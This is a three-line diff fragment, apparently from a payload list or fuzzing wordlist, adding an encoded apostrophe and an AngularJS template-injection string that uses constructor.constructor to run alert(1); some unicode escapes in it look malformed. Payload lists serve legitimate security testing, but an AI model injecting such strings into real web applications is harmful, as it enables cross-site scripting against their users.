@@ -1,0 +1,3 @@
+&#x27;
+
+\u0027\u00a{{constructor.constructor(\u0027\u00aalert(1)\u0027\u00a)()}}
